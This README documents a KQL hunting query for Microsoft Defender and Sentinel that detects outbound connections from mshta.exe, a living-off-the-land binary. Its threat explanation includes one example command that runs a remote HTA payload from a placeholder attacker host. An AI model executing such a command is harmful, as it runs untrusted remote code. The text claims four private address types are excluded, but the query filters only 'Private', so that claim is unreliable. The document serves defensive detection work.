# mshta.exe Outbound Network Connections — Hunting Query

A KQL hunting query for Microsoft Defender for Endpoint (Advanced Hunting) and Microsoft Sentinel (when the `DeviceNetworkEvents` and `DeviceProcessEvents` tables are available via the M365 Defender data connector) that surfaces outbound network activity from `mshta.exe` along with full parent-process context.

Useful for detecting abuse of the Microsoft HTML Application host (`mshta.exe`) as a living-off-the-land binary (LOLBin) for remote payload execution, command-and-control, or initial access delivery.

## Why This Matters

`mshta.exe` is a signed Microsoft binary that executes Microsoft HTML Applications (`.hta`). It can run arbitrary VBScript or JScript embedded in remote or local HTA files, which makes it a popular tool for:

- **Initial access** — phishing attachments or links delivering `.hta` payloads
- **Remote code execution** — `mshta.exe https://attacker.example/payload.hta` runs script directly from a URL without writing to disk
- **Defense evasion** — executing from a trusted signed binary bypasses some application-control policies
- **Command and control** — periodic HTTP/HTTPS callbacks to attacker-controlled infrastructure

Under normal enterprise use, `mshta.exe` should rarely (if ever) make outbound connections to public IPs. Any external traffic from this binary is worth investigating. Common MITRE ATT&CK references: **T1218.005 — Signed Binary Proxy Execution: Mshta**.

## What It Does

The query returns one row per outbound network connection initiated by `mshta.exe`, enriched with parent-process information:

| Column | Description |
|---|---|
| `Timestamp` | Time of the network connection |
| `DeviceName` | Host that made the connection |
| `AccountName` | User context under which `mshta.exe` ran |
| `ParentProcessName` | Process that launched `mshta.exe` (e.g., `winword.exe`, `outlook.exe`, `explorer.exe`) |
| `ParentCommandLine` | Full command line of the parent process |
| `InitiatingProcessCommandLine` | Command line of `mshta.exe` itself — often contains the URL or HTA path |
| `RemoteIP` | Destination IP address |
| `RemoteUrl` | Destination URL (if resolved) |
| `RemotePort` | Destination port |
| `RemoteIPType` | Address classification (`Public`, private types are filtered out) |

Private address spaces (`Private`, `Loopback`, `LinkLocal`, `Reserved`) are excluded to focus on outbound traffic leaving the corporate network.

## The Query

```kusto
// Single query: mshta.exe outbound network connections with full process context
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "mshta.exe"
| where RemoteIPType != "Private"
| join kind=leftouter (
    DeviceProcessEvents
    | where FileName =~ "mshta.exe"
    | project
        DeviceName,
        ProcessId,
        ParentProcessName = InitiatingProcessFileName,
        ParentCommandLine = InitiatingProcessCommandLine,
        AccountName
) on DeviceName, $left.InitiatingProcessId == $right.ProcessId
| project
    Timestamp,
    DeviceName,
    AccountName,
    ParentProcessName,
    ParentCommandLine,
    InitiatingProcessCommandLine,
    RemoteIP,
    RemoteUrl,
    RemotePort,
    RemoteIPType
| order by Timestamp desc
```


